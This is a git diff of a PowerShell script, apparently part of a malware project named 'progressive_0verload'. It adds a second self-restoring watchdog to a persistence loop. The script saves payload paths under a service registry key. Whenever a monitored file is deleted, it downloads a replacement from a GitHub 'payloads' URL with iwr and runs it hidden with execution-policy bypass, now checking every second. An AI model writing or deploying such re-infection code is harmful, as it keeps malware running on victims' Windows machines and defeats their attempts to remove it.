@@ -29,7 +29,8 @@ Add-Type -TypeDefinition $signature
 $serviceName = "MyRootService" # change this to the name of the service
 $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
 $propertyName = "root"
-
+$propertyName2 = "rootMonMon"
+$rootmonmonPath = ""
 
 
 $item = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
@@ -50,6 +51,11 @@ if (-not($item)) {
 else{
     $rootPath = $item.$propertyName
     $canUpdateRootPath = $true
+}
+
+$item2 = Get-ItemProperty -Path "$basePath" -Name $propertyName2 -ErrorAction SilentlyContinue
+if($item2){
+    $rootmonmonPath = $item2.$propertyName2
 }
 
 $idx = Get-Random -Minimum 0 -Maximum $paths.Length
@@ -85,6 +91,9 @@ while ($true) {
 
     if(-not(Test-Path -Path $rootPath -PathType Leaf)){
         if($canUpdateRootPath){
+            $idx = Get-Random -Minimum 0 -Maximum $paths.Length
+            $initServicePath = $paths[$idx]
+            $initServicePath = "$initServicePath\init_service_root.ps1"
             $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
             $rootPath = "$rootPath\root.ps1"
             Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
@@ -99,6 +108,16 @@ while ($true) {
         powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath -basePath "$b"
     }
     $canUpdateRootPath=$true
+
+    if(-not(Test-Path -Path $rootmonmonPath -PathType Leaf)){
+        $initServiceRootmonmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+        $initServiceRootmonmonPath = "$initServiceRootmonmonPath\init_service_rootmonmon.ps1"
+        $rootmonmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+        $rootmonmonPath = "$rootmonmonPath\root_mon_mon.ps1"
+        Set-ItemProperty -Path "$basePath" -Name $propertyName2 -Value $rootmonmonPath -Force | Out-Null
+        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1" -OutFile $initServiceRootmonmonPath
+        powershell.exe -ep bypass -noP -w hidden $initServiceRootmonmonPath -rootPath $rootPath -basePath "$b"
+    }
     
-    Start-Sleep -Seconds 3
+    Start-Sleep -Seconds 1
 }
